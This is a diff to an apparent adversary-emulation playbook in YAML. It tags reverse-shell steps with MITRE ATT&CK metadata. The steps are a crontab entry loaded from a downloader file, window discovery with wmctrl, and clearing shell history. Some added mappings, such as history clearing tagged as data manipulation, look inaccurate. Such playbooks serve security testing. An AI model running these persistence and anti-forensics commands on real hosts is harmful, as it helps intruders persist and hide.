@@ -794,20 +794,26 @@ commands:
     cmd: (crontab -l; cat /home/judy/downloader.txt) | crontab -
     metadata:
       techniques: "T1029"
+      tactics: "Exfiltration"
+      technique_name: "Scheduled Transfer"
 
   # find out which windown are open
   - type: msf-session
     session: revshell
     cmd:  wmctrl -l
     metadata:
-      techniques: "T010"
+      techniques: "T1010"
+      tactics: "Discovery"
+      technique_name: "Application Window Discovery"
 
   # clear history
   - type: msf-session
     session: revshell
     cmd: history -c
     metadata:
-      techniques: "T1565"
+      techniques: "T1565.001"
+      tactics: "Defensive Evasion"
+      technique_name: "Data Manipulation: Stored Data Manipulation"
 
   # exit the interactive shell
   - type: msf-session
